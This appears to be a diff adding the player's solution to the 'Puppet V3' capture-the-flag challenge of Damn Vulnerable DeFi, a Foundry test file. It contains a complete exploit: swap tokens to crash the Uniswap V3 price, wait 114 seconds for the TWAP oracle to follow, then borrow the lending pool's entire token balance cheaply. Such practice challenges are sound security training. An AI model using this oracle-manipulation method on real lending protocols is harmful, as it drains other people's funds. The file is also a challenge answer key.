@@ -5,6 +5,7 @@ pragma solidity =0.8.25;
 import {Test, console} from "forge-std/Test.sol";
 import {IUniswapV3Factory} from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Factory.sol";
 import {IUniswapV3Pool} from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
+import {ISwapRouter} from "@uniswap/v3-periphery/contracts/interfaces/ISwapRouter.sol";
 import {WETH} from "solmate/tokens/WETH.sol";
 import {FixedPointMathLib} from "solmate/utils/FixedPointMathLib.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
@@ -27,8 +28,10 @@ contract PuppetV3Challenge is Test {
     INonfungiblePositionManager positionManager =
         INonfungiblePositionManager(payable(0xC36442b4a4522E871399CD717aBDD847Ab11FE88));
     WETH weth = WETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
+    ISwapRouter router = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);
     DamnValuableToken token;
     PuppetV3Pool lendingPool;
+    IUniswapV3Pool uniswapPool;
 
     uint256 initialBlockTimestamp;
 
@@ -68,7 +71,7 @@ contract PuppetV3Challenge is Test {
             sqrtPriceX96: _encodePriceSqrt(1, 1)
         });
 
-        IUniswapV3Pool uniswapPool = IUniswapV3Pool(uniswapFactory.getPool(address(weth), address(token), FEE));
+        uniswapPool = IUniswapV3Pool(uniswapFactory.getPool(address(weth), address(token), FEE));
         uniswapPool.increaseObservationCardinalityNext(40);
 
         // Deployer adds liquidity at current price to Uniswap V3 exchange
@@ -119,7 +122,54 @@ contract PuppetV3Challenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppetV3() public checkSolvedByPlayer {
+        /**
+         * VULNERABILITY EXPLANATION:
+         * Unlike V1/V2 that use spot price, PuppetV3Pool uses Uniswap V3's TWAP oracle
+         * over a 10-minute period. However, after a large swap, waiting even a short time
+         * (up to 114 seconds allowed) starts to affect the TWAP calculation.
+         *
+         * The TWAP is calculated as: (tickCumulative[now] - tickCumulative[now - 10min]) / 10min
+         * When we swap and then wait, new tick observations at the new (lower) price start
+         * accumulating, gradually pulling the TWAP down.
+         *
+         * EXPLOIT STRATEGY:
+         * 1. Swap all 110 DVT for WETH on Uniswap V3 (crashes spot price)
+         * 2. Wrap our ETH to WETH
+         * 3. Skip time (up to 114 seconds) for TWAP to update
+         * 4. Borrow all tokens from pool at manipulated low price
+         * 5. Transfer to recovery
+         */
+
+        // Step 1: Swap all DVT for WETH (crashes the spot price)
+        token.approve(address(router), PLAYER_INITIAL_TOKEN_BALANCE);
+        router.exactInputSingle(
+            ISwapRouter.ExactInputSingleParams({
+                tokenIn: address(token),
+                tokenOut: address(weth),
+                fee: FEE,
+                recipient: player,
+                deadline: block.timestamp,
+                amountIn: PLAYER_INITIAL_TOKEN_BALANCE,
+                amountOutMinimum: 0,
+                sqrtPriceLimitX96: 0
+            })
+        );
+
+        // Step 2: Wrap remaining ETH to WETH
+        weth.deposit{value: player.balance}();
+
+        // Step 3: Wait for TWAP to partially update (within 114 second limit)
+        skip(114);
+
+        // Step 4: Calculate deposit needed and borrow all tokens
+        uint256 depositRequired = lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
         
+        // Approve and borrow
+        weth.approve(address(lendingPool), depositRequired);
+        lendingPool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+
+        // Step 5: Transfer all tokens to recovery
+        token.transfer(recovery, LENDING_POOL_INITIAL_TOKEN_BALANCE);
     }
 
     /**
